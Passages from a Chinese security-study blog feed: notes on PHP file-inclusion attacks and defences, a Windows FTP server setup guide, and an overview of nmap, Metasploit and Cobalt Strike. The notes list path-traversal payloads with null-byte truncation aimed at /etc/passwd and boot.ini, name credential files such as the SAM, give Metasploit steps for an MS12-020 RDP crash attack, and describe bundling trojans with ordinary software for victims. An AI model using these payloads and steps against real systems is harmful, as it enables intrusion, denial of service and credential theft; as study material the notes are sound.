<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\boot.ini                                  //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml                // IIS配置文件</span><br><span class="line">C:\windows\repair\sam                           //存储Windows系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini                   // MySQL配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\usr.MYD       // MySQL root</span><br><span class="line">C:\windows\php.ini                              // PHP配置信息</span><br><span class="line">C:\windows\my.ini                                       // MySQL配置信息</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<hr>
<p>2.UNIX&#x2F;Linux系统</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd </span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf                  // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf     //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini                         // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf                              // Apache配置文件</span><br><span class="line">/etc/my.conf                                            // MySQL配置文件</span><br><span class="line">/proc/self/environ                                      // Linux下环境变量文件</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><p>以Session文件包含为例，Session文件保存在服务器端，并且Session中保存着用户的敏感信息。利用的条件为攻击者必须能够控制部分Session文件的内容，Session文件一般存放在&#x2F;tmp&#x2F;、&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;、&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;等目录下，一般以sess_SESSIONID为名来保存。</p>
<p>首先，查找到Session文件并包含一次。可以通过Firefox的fire cookie插件查看当前Session值来找到文件名。</p>
<p>实际应用过程中，需要注意以下几点：</p>
<p>1）网站可能没有生成临时Session，而是以Cookie方式保存用户信息，或者根本就没有Session，但目前这种情况非常少见。</p>
<p>2）对于Session文件内容的控制，需要先通过包含查看当前Session的内容，看Session值中有没有可控的某个变量，比如URL中的变量值，或者当前用户名username。如果有的话，就可以通过修改可控变量值控制恶意代码写入Session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的Session文件。这样就可以通过控制服务器使报错的语句将恶意代码写入Session。</p>
<h2 id="PHP封装协议包含"><a href="#PHP封装协议包含" class="headerlink" title="PHP封装协议包含"></a>PHP封装协议包含</h2><p>要求allow_url_fopen为设置为ON。在PHP5.2.0之后的版本中支持data：伪协议，可以很方便地执行代码。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617204352489.png"></p>
<h2 id="利用方式总结"><a href="#利用方式总结" class="headerlink" title="利用方式总结"></a>利用方式总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617204439781.png"></p>
<h2 id="防护手段及对应的绕过方式"><a href="#防护手段及对应的绕过方式" class="headerlink" title="防护手段及对应的绕过方式"></a>防护手段及对应的绕过方式</h2><p>文件包含漏洞在攻击方面会有两个关注点：<strong>包含目标文件内容合法性</strong>以及<strong>包含文件的路径</strong>。</p>
<p>针对<strong>文件内容合法性</strong>，更多的是要在<strong>各类上传及文件接口</strong>上做好对应的防护。</p>
<p>在文件包含漏洞的防护方面，更多的是针对包含文件的<strong>过程</strong>进行防护，防护手段主要分为<strong>对包含目标的参数过滤</strong>和<strong>中间件级安全配置</strong>两个方面。</p>
<h3 id="1-文件名验证"><a href="#1-文件名验证" class="headerlink" title="1.文件名验证"></a>1.文件名验证</h3><p>包含文件验证是指对可包含文件名设置黑名单或白名单、文件后缀名固定等，效果非常类似于文件上传攻击中针对文件后缀名的防护方式，比如只允许后缀为jpg的文件包含等。针对文件名的防护方式思路非常清晰，即严格限定文件类型。</p>
<p>采取的方法主要为：</p>
<p>1）文件后缀名固定：在包含的文件名后加固定后缀，期望文件按预期目标解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include (&quot;&quot;.$_GET[&#x27;page&#x27;].&quot;html&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2）文件名过滤：这里可以用白名单或黑名单过滤，使用switch或array限制可以包含的文件名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?PHP&gt;</span><br><span class="line">        $filename = explode (&#x27;.&#x27;$name)</span><br><span class="line">        switch($filename)</span><br><span class="line">        &#123;</span><br><span class="line">            case &#x27;jpg&#x27;;</span><br><span class="line">            case &#x27;png&#x27;;</span><br><span class="line">                include &#x27;$name&#x27;;</span><br><span class="line">            break;</span><br><span class="line">            default:</span><br><span class="line">                echo &quot;无效文件，请重新选择&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>类似于上传攻击中的文件白名单防护功能。</p>
<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>针对文件名验证的绕过方式嘞</p>
<p>一种方式是在<strong>文件后缀名处下手</strong>，根据中间件或操作系统的特性实现对原有防护规则的绕过。</p>
<blockquote>
<p>攻击者可以在文件名后放一个空字节的编码，从而绕过这样的文件类型的检查。例如，对于“..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”，Web应用程序使用的API会允许字符串中包含空字符，当实际获取文件名时，则由系统的API直接截断，而解析为“..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini”，这是利用PHP5.3.4之前的%00截断特定实现的，在上传攻击中也有相关利用措施。</p>
</blockquote>
<blockquote>
<p>在类UNIX的系统中也可以使用URL编码的换行符，例如，对于“..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%0a.jpg”，如果文件系统获取含有换行符的文件名，会截断为”..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”。</p>
</blockquote>
<p>另一种方式是通过<strong>目录长度限制</strong>来截断。</p>
<blockquote>
<p>Windows下可利用256位截断，Linux下则需要4096位截断。可能会发生URL过长无法解析的问题，浏览器支持的URL长度一般都在10000以上，但是不同的中间件并不一定支持过长的URL，因此这种方法在Windows服务器环境下更容易成功（要求PHP版本小于5.2.8环境）。</p>
</blockquote>
<p>假如后台代码 <code>include($_GET[&#39;file&#39;].&#39;.txt&#39;);</code></p>
<p>若参数为?file&#x3D;phpinfo.php&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;……</p>
<p>通过&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;截断之后的.txt。</p>
<p>要注意的是，采用.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;填充还是&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.填充与之前目录长度的奇偶性有关。</p>
<h3 id="2-路径限制"><a href="#2-路径限制" class="headerlink" title="2.路径限制"></a>2.路径限制</h3><p>针对包含文件的目录进行合法性校验，也就是对包含的文件路径进行严格的限制。</p>
<p>针对包含文件的目录进行合法性校验，也就是对包含的文件路径进行严格的限制。</p>
<p>1）目录限制，在用户提交的变量前增加固定路径，限制用户可调用的目录范围。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   //可设定只允许包含的文件目录</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include &#x27;/var/www/html&#x27;.$file;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2）目录回退符过滤，避免回退符生效导致路径变化。</p>
<p>目录回退符常用“&#x2F;”“.”等符号实现。因此，对用户输入的参数中的特殊字符进行过滤，即可避免出现目录回退的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function filter($str)</span><br><span class="line">    &#123;</span><br><span class="line">        $str=str_replace(&quot;..&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;.&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&quot;\\&quot;,&quot;&quot;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">    $file = $_GET[&#x27;page&#x27;];</span><br><span class="line">    $file = filter($file);</span><br><span class="line">    if($file)</span><br><span class="line">    &#123;</span><br><span class="line">        include $file;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><blockquote>
<p>在某些场景下，可通过某些特殊的符号（如“<del>”）来尝试绕过，如提交“image.php？name&#x3D;</del>&#x2F;..&#x2F;phpinfo”这样的代码。其中“~”就是尝试是否可直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录的效果。</p>
</blockquote>
<p>或者</p>
<blockquote>
<p>..&#x2F;..&#x2F;将当前目录进行回溯</p>
</blockquote>
<h3 id="3-中间件安全配置"><a href="#3-中间件安全配置" class="headerlink" title="3.中间件安全配置"></a>3.中间件安全配置</h3><p>主要思路是限制当前中间件所在用户的权限。推荐给Web服务器配置独立用户，只拥有访问本目录及使用中间件的权限，从而有效避免越权访问其他的文件。</p>
<p>以Apache中间件+PHP为例。</p>
<p>以下几点均可影响到文件包含功能的安全性。</p>
<p>·magic_quotes_gpc</p>
<blockquote>
<p>post、get、cookie过来的单引号（’）、双引号（”）、反斜线（\）与NULL字符应增加转义字符“\”。利用GPC过滤与SQL注入中的参数内容转义方法非常类似，都是让用户的传递参数意义发生变化。此项目在PHP5.4之后已弃用，也可根据实际业务特点自行编写转义脚本。</p>
</blockquote>
<p>·限制访问区域</p>
<blockquote>
<p>open_basedir可用来将用户访问文件的活动范围限制在指定的区域，此选项在php.ini中进行设置。同理，在apache配置文件中（httpd.conf），也可利用Directory、VirtualHost等进行类似的目录限制。在利用Apache做相应配置时需要注意，如果Apache开启了虚拟主机（VirtualHost），那么就会影响PHP.ini中的open_basedir的效果，因此需根据实际环境选择合适的范围限制方法。</p>
</blockquote>
<p>·设置访问权限</p>
<blockquote>
<p>主要思路是限制当前中间件所在用户的权限。推荐给Web服务器配置独立用户，只拥有访问本目录及使用中间件的权限，从而有效避免越权访问其他的文件。</p>
</blockquote>
<h4 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>通过软链接指向允许范围外的文件（需服务器已有软连接配置），实现文件包含。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>针对文件包含攻击，标准的防护手段及可实现的绕过方式有以下几种：</p>
<p>1）尽可能保持中间件及PHP版本最新，从而有效避免低版本中存在大量利用%00、..&#x2F;..&#x2F;、点号截断的情况。</p>
<p>2）利用配置文件中的目录限制功能对用户可访问的目录进行限制。</p>
<p>3）利用黑白名单进行过滤。</p>
<p>文件包含攻击主要在低版本的PHP中可有效进行。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617215821611.png"></p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器搭建</title>
    <url>/2023/06/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="一、win10"><a href="#一、win10" class="headerlink" title="一、win10"></a>一、win10</h1><h2 id="1-ftp服务器"><a href="#1-ftp服务器" class="headerlink" title="1.ftp服务器"></a>1.ftp服务器</h2><h3 id="a-作用"><a href="#a-作用" class="headerlink" title="a.作用"></a>a.作用</h3><p>互联网上提供文件存储和访问服务的计算机，用来传递、保存和分发文件给各个客户端。</p>
<h3 id="b-配置步骤"><a href="#b-配置步骤" class="headerlink" title="b.配置步骤"></a>b.配置步骤</h3><h4 id="1）设置防火墙"><a href="#1）设置防火墙" class="headerlink" title="1）设置防火墙"></a>1）设置防火墙</h4><p>控制面板-&gt;windows defender-&gt;允许应用或功能通过windows defender，勾选ftp服务器即可</p>
<p><img src="/../../../Typora/img111/image-20230612203153980.png" alt="image-20230612203153980"></p>
<h4 id="2-启用windows功能"><a href="#2-启用windows功能" class="headerlink" title="2)启用windows功能"></a>2)启用windows功能</h4><p>控制面板-&gt;程序和功能-&gt;启用或关闭windows功能-&gt;internet information services-&gt;勾选ftp服务器</p>
<h4 id="3-本地建立存放文件的文件夹"><a href="#3-本地建立存放文件的文件夹" class="headerlink" title="3)本地建立存放文件的文件夹"></a>3)本地建立存放文件的文件夹</h4><ol>
<li><p>建立文件夹，如我的E:\final</p>
</li>
<li><p>右键该文件夹属性-&gt;安全-&gt;编辑-&gt;勾选完全控制（authenticed user下）</p>
</li>
<li><p>win+r compmgmtlauncher，计算机管理 -&gt; 系统工具 -&gt; 本地用户和组-&gt;新建用户(yuleiyun,123123)，右键查看属性，是隶属于Users组的</p>
</li>
<li><p>可以新建一个ftpGroups组，然后令yuleiyun只隶属于该组</p>
<blockquote>
<p>（但我没有本地用户和组，通过mmc添加也失败了，百度说是因为win10家庭版没有该功能，那我只能先升级专业版了）</p>
</blockquote>
<p>找到一个有效密钥升级后，激活下即可</p>
<p><a href="https://zhuanlan.zhihu.com/p/605819151">WIN10专业版系统激活2023.2.13 - 知乎 (zhihu.com)</a></p>
</li>
</ol>
<h4 id="4-搭建ftp服务器"><a href="#4-搭建ftp服务器" class="headerlink" title="4)搭建ftp服务器"></a>4)搭建ftp服务器</h4><p>打开win中s搜索iis并打开，</p>
<p><img src="/../../../Typora/img111/image-20230612212130227.png"></p>
<p>IP地址设为本机IP地址</p>
<p><img src="/../../../Typora/img111/image-20230612212236451.png"></p>
<p><img src="/../../../Typora/img111/image-20230612213155655.png"></p>
<p>然后去物理路径中，即E:&#x2F;final，设置下文件夹权限，添加组即可</p>
<p><img src="/../../../Typora/img111/image-20230612213414869.png"></p>
<p>服务里要启动下micro…ftp服务，再去IIS启动ftp服务器</p>
<p><img src="/../../../Typora/img111/image-20230612213728587.png" alt="image-20230612213728587"></p>
<h4 id="5-验证"><a href="#5-验证" class="headerlink" title="5)验证"></a>5)验证</h4><p><img src="/../../../Typora/img111/image-20230612214423630.png" alt="image-20230612214423630"></p>
<p><img src="/../../../Typora/img111/image-20230612214234726.png" alt="image-20230612214234726"></p>
<p> 为什么在edge浏览器中输入ftp:&#x2F;&#x2F;本机IP 时，让打开360浏览器呢</p>
<h2 id="2-总结"><a href="#2-总结" class="headerlink" title="2.总结"></a>2.总结</h2><p>搭建ftp服务器，使得局域网下的各主机可以传递、下载并存储文件。</p>
]]></content>
      <categories>
        <category>服务器搭建</category>
      </categories>
      <tags>
        <tag>服务器搭建</tag>
        <tag>ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具</title>
    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="一、nmp"><a href="#一、nmp" class="headerlink" title="一、nmp"></a>一、nmp</h2><h3 id="1-nmap是什么"><a href="#1-nmap是什么" class="headerlink" title="1.nmap是什么"></a>1.nmap是什么</h3><p>是一款检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息的专业工具</p>
<h3 id="2-运行环境"><a href="#2-运行环境" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
<h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3.功能"></a>3.功能</h3><ol>
<li><p>主机发现功能：向目标计算机发送特制的数据包组合，然后根据目标的反应来确定它是否处于开机并连接到网络的状态。</p>
</li>
<li><p>端口扫描：向目标计算机的指定端口发送特制的数据包组合，然后根据目标端口的反应来判断它是否开放。</p>
</li>
<li><p>服务及版本检测：向目标计算机的目标端口发送特制的数据包组合，然后根据目标的反应来检测它运行服务的服务类型和版本。</p>
</li>
<li><p>操作系统检测：向目标计算机发送特制的数据包组合，然后根据目标的反应来检测它的操作系统类型和版本。</p>
</li>
</ol>
<h3 id="3-简单用法"><a href="#3-简单用法" class="headerlink" title="3.简单用法"></a>3.简单用法</h3><p>参数为：</p>
<p>-sS：syn半开扫描，隐蔽性强<br>        -sY：全开扫描，比较准确<br>        -sT：会大量记录日志，慎用<br>        -sP：主机存活才会扫描的ping扫描<br>        -sA：高级扫描，穿透防火墙规则过滤<br>        -sV：版本探针扫描<br>        -Pn：被禁ping扫描方法<br>        -A：全面扫描</p>
<p>-exclude 除了</p>
<p>-sO：使用IP protocol扫描确定目标机支持的协议类型。</p>
<p>nmap ip确定目标主机在线情况及端口基本状况</p>
<h4 id="扫描单个地址，多个地址，一个范围的地址"><a href="#扫描单个地址，多个地址，一个范围的地址" class="headerlink" title="扫描单个地址，多个地址，一个范围的地址"></a>扫描单个地址，多个地址，一个范围的地址</h4><blockquote>
<p>namp xxx</p>
<p>nmap xxx yyy</p>
<p>nmap xxx-zzz</p>
</blockquote>
<h4 id="扫描目标地址所在网段"><a href="#扫描目标地址所在网段" class="headerlink" title="扫描目标地址所在网段"></a>扫描目标地址所在网段</h4><p>nmap 192.168.1.17&#x2F;24</p>
<h4 id="目标地址的操作系统指纹识别"><a href="#目标地址的操作系统指纹识别" class="headerlink" title="目标地址的操作系统指纹识别"></a>目标地址的操作系统指纹识别</h4><p>nmap –O 192.168.0.105</p>
<h4 id="目标地址开放的端口对应的服务版本信息"><a href="#目标地址开放的端口对应的服务版本信息" class="headerlink" title="目标地址开放的端口对应的服务版本信息"></a>目标地址开放的端口对应的服务版本信息</h4><p>map-sV 192.168.0.105</p>
<h4 id="探测防火墙状态"><a href="#探测防火墙状态" class="headerlink" title="探测防火墙状态"></a>探测防火墙状态</h4><p>在实战中，可以利用FIN扫描的方式探测防火墙的状态。FIN扫描用于识别端口是否关闭，收到RST回复说明该端口关闭，否则就是open或filtered状态，</p>
<p>nmap-sF –T4 192.168.0.105</p>
<h3 id="4-状态识别"><a href="#4-状态识别" class="headerlink" title="4.状态识别"></a>4.状态识别</h3><p>Nmap输出的是扫描列表，包括端口号、端口状态、服务名称、服务版本及协议。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620150540777.png"></p>
<h3 id="5-进阶使用"><a href="#5-进阶使用" class="headerlink" title="5.进阶使用"></a>5.进阶使用</h3><p>Nmap的脚本主要分为以下几类。</p>
<p>● Auth：负责处理鉴权证书（绕过鉴权）的脚本。</p>
<p>● Broadcast：在局域网内探查更多服务的开启情况，如DHCP&#x2F;DNS&#x2F;SQLServer等。</p>
<p>● Brute：针对常见的应用提供暴力破解方式，如HTTP&#x2F;SMTP等。</p>
<p>● Default：使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力。</p>
<p>● Discovery：对网络进行更多信息的搜集，如SMB枚举、SNMP查询等。</p>
<p>● Dos：用于进行拒绝服务攻击。</p>
<p>● Exploit：利用已知的漏洞入侵系统。</p>
<p>● External：利用第三方的数据库或资源。例如，进行Whois解析。</p>
<p>● Fuzzer：模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞。</p>
<p>● Intrusive：入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽。</p>
<p>● Malware：探测目标机是否感染了病毒、开启后门等信息。</p>
<p>● Safe：此类与Intrusive相反，属于安全性脚本。</p>
<p>● Version：负责增强服务与版本扫描功能的脚本。</p>
<p>● Vuln：负责检查目标机是否有常见漏洞，如MS08-067。</p>
<h4 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h4><p>用户还可根据需要设置–script&#x3D;类别进行扫描，常用参数如下所示。</p>
<p>●-sC&#x2F;–script&#x3D;default：使用默认的脚本进行扫描。</p>
<p>●–script&#x3D;<Lua scripts>：使用某个脚本进行扫描。</p>
<p>●–script-args&#x3D;key1&#x3D;value1,key2&#x3D;value2······：该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接。</p>
<p>● –script-args-file&#x3D;filename：使用文件为脚本提供参数。</p>
<p>●–script-trace：如果设置该参数，则显示脚本执行过程中发送与接收的数据。</p>
<p>●–script-updatedb：在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</p>
<p>●–script-help：调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息。</p>
<h4 id="弱口令检测"><a href="#弱口令检测" class="headerlink" title="弱口令检测"></a>弱口令检测</h4><p>使用–script&#x3D;auth可以对目标主机或目标主机所在的网段进行应用弱口令检测，</p>
<p><code>nmap--script=auth 192.168.0.105</code></p>
<h4 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h4><p><code>nmap--script=brute 192.168.0.105</code></p>
<h4 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h4><p><code>nmap--script=vuln 192.168.0.105</code></p>
<h4 id="应用服务扫描"><a href="#应用服务扫描" class="headerlink" title="应用服务扫描"></a>应用服务扫描</h4><p>如VNC服务</p>
<p><code>nmap--script=realvnc-auth-bypass 192.168.0.105</code></p>
<h4 id="探测局域网内更多服务开启情况"><a href="#探测局域网内更多服务开启情况" class="headerlink" title="探测局域网内更多服务开启情况"></a>探测局域网内更多服务开启情况</h4><p><code>nmap –n –p 445--script=broadcast 192.168.0.105</code></p>
<h4 id="whois解析"><a href="#whois解析" class="headerlink" title="whois解析"></a>whois解析</h4><h2 id="二、msf-Metasploit"><a href="#二、msf-Metasploit" class="headerlink" title="二、msf(Metasploit)"></a>二、msf(Metasploit)</h2><h3 id="1-msf是什么"><a href="#1-msf是什么" class="headerlink" title="1.msf是什么"></a>1.msf是什么</h3><p>msf是一个框架，附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p>
<p>kali已经自带了。</p>
<h3 id="2-运行环境-1"><a href="#2-运行环境-1" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
<h3 id="3-功能模块"><a href="#3-功能模块" class="headerlink" title="3.功能模块"></a>3.功能模块</h3><ol>
<li><p>Auxiliary（辅助模块）：为渗透测试信息搜集提供了大量的辅助模块支持</p>
</li>
<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
</li>
<li><p>Payload（攻击载荷模块）：攻击成功后促使靶机运行的一段植入代码</p>
</li>
<li><p>Post （后渗透攻击模块）：收集更多信息或进一步访问被利用的目标系统</p>
</li>
<li><p>Encoders（编码模块）:负责免杀,将攻击载荷进行编码，来绕过防护软件拦截</p>
<p>● 扫描目标机系统，寻找可用漏洞。</p>
<p>● 选择并配置一个漏洞利用模块。</p>
<p>● 选择并配置一个攻击载荷模块。</p>
<p>● 选择一个编码技术，用来绕过杀毒软件的查杀。</p>
<p>● 渗透攻击。</p>
</li>
</ol>
<h3 id="4-简单使用（蓝屏攻击）"><a href="#4-简单使用（蓝屏攻击）" class="headerlink" title="4.简单使用（蓝屏攻击）"></a>4.简单使用（蓝屏攻击）</h3><p>靶机可作为winxp，kali作为攻击机，两者同一局域网下。</p>
<p>winxp需要：</p>
<p>-开启3389端口（系统远程桌面服务）</p>
<p>-未安装蓝屏攻击补丁</p>
<p>-关闭防火墙</p>
<h4 id="a-先端口探测"><a href="#a-先端口探测" class="headerlink" title="a)先端口探测"></a>a)先端口探测</h4><p><code>nmap -sS -Pn -A 目标ip</code></p>
<p>确认开放了3389端口。</p>
<h4 id="b-进入msf，serch-ms12-020"><a href="#b-进入msf，serch-ms12-020" class="headerlink" title="b)进入msf，serch ms12_020"></a>b)进入msf，serch ms12_020</h4><p>出现两个模块，第一个为漏洞利用模块，第二个为漏洞验证模块</p>
<h5 id="1）验证"><a href="#1）验证" class="headerlink" title="1）验证"></a>1）验证</h5><p><code>use auxiliary/scanner/rdp/ms12_020_check</code>进入漏洞验证模块</p>
<p>输入<code>show options</code>查看相关参数配置</p>
<p>一般需要配置rhosts，<code>set rhosts 目标ip</code>后</p>
<p>输入run运行即可</p>
<p>会显示The target is vulnerable，证明该主机漏洞存在</p>
<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong>即可</p>
<h2 id="三、cobalt-strike"><a href="#三、cobalt-strike" class="headerlink" title="三、cobalt strike"></a>三、cobalt strike</h2><h3 id="1-cs是什么"><a href="#1-cs是什么" class="headerlink" title="1.cs是什么"></a>1.cs是什么</h3><p>渗透测试神器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。</p>
<p>本质是c2（command&amp;control），类似于teamserver发布命令，client执行命令，远控</p>
<h3 id="2-运行环境-2"><a href="#2-运行环境-2" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>一般是kali启动teamserver服务（有java的linux平台），主机运行客户端（java环境）。客户端所填的ip地址就是kali的地址。正常实战时，cs隐藏特征和流量混淆一下，免杀。</p>
<h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>将木马放到目标机：</p>
<p>先将木马放到本地，做好免杀后，传到getshell的目标服务器上中去。（一般将木马与正常软件捆绑成一个压缩包，发给受害者，受害者在不知情的情况下打开）。当目标机运行后，本地就可以监听到，进行提权操作后，可执行其他命令。</p>
<p>参考：[内网渗透工具CobaltStrike使用教程详解_cobaltstrike教程_归去来兮-zangcc的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request_id%22:%22168437783916800211513558%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168437783916800211513558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=cobalt">https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request%5Fid%22%3A%22168437783916800211513558%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168437783916800211513558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=cobalt</a> strike&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p>[ Cobalt Strike使用教程——基础篇_Captain_RB的博客-CSDN博客](<a href="https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&request_id=&biz_id=102&utm_term=cobalt">https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=cobalt</a> strike&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-3-116843274.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>漏扫工具。</p>
]]></content>
      <categories>
        <category>渗透工具</category>
        <category>漏扫工具</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>nmap</tag>
        <tag>cs</tag>
        <tag>Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试</title>
    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
<h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>要获取到什么权限</p>
<p>2.信息收集</p>
<p>在信息收集中，最主要的就是收集<strong>服务器的配置信息和网站的敏感信息</strong>，其中包括<strong>域名及子域名信息﹑目标网站系统﹑CMS指纹﹑目标网站真实IP﹑开放的端口等</strong>。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集。</p>
<p>基础设施枚举（获取公司在互联网和内部网上的位置；确定公司的安全措施）</p>
<p>服务枚举（服务版本、服务信息；许多服务有版本历史记录，可以识别主机或服务器上安装的版本是否是真的或新的）</p>
<p>主机枚举（确定该主机或服务器扮演什么角色以及它与哪些网络组件通信。此外，确定所用服务及用途，以及端口。）</p>
<p>掠夺（获取敏感信息如员工姓名、客户数据【需要在目标主机上获取到访问权限】）</p>
<p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
<h4 id="2-1域名信息"><a href="#2-1域名信息" class="headerlink" title="2.1域名信息"></a>2.1域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
<p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
<p>备案信息</p>
<h5 id="2-1-1-whois"><a href="#2-1-1-whois" class="headerlink" title="2.1.1 whois"></a>2.1.1 whois</h5><p>Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p>
